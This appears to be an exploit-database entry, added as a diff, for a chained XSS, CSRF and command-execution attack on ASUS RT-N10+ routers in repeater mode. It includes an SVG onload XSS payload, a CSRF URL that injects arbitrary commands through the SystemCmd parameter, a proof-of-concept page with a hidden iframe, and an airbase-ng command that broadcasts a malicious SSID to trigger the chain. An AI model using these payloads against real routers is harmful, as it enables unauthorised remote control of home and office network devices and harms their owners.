@@ -1,0 +1,40 @@
+id: 33397
+date: 10/21/2019
+title: ASUS RT-N10+ 2.0.3.4 CSRF / XSS / Command Execution Exploit
+author: Matheus Vrech
+cves: 
+
+# Exploit Title: XSS And CSRF to RCE in ASUS RT-N10 Repeater Mode
+# Exploit Author: Matheus Vrech
+# Vendor Homepage: https://www.asus.com/
+# Version: ASUS RT-N10+, Firmware: 2.0.3.4
+# Tested on: Archlinux, Windows 10
+ 
+# XSS:
+# when someone change router to repeater mode you should be able to trigger javascript code:
+# just create an AP with the payload ad wait the person to look for the available routers to repeat
+vulnerable page: http://192.168.1.1/survey.htm
+payload: <svg/onload="alert('xss')">
+
+# CSRF + RCE
+# it's possible to inject commands into the router by just triggering a authenticated user to acess the following url:
+# change COMMAND to yout command
+vulnerable url: http://192.168.1.1/apply.cgi?current_page=Main_AdmStatus_Content.asp&next_page=Main_AdmStatus_Content.asp&next_host=&sid_list=FirewallConfig%3B&group_id=&modified=0&action_mode=+Refresh+&first_time=&action_script=&preferred_lang=EN&SystemCmd=COMMAND&action=Refresh"
+
+# With both of them it's possible to execute command abusing the repeater mode XSS
+
+POC:
+# create the page:
+
+<html>
+<head>
+</head>
+<body>
+        <iframe style="display: none" src="http://192.168.1.1/apply.cgi?current_page=Main_AdmStatus_Content.asp&next_page=Main_AdmStatus_Content.asp&next_host=&sid_list=FirewallConfig%3B&group_id=&modified=0&action_mode=+Refresh+&first_time=&action_script=&preferred_lang=EN&SystemCmd=touch /tmp/pwned&action=Refresh"></iframe>
+</body>
+</html>
+
+# start your AP:
+airbase-ng -e "<iframe src="//your.domain">" -c 8 -v wlp2s0mon
+
+#  0day.today [2023-03-23]  #
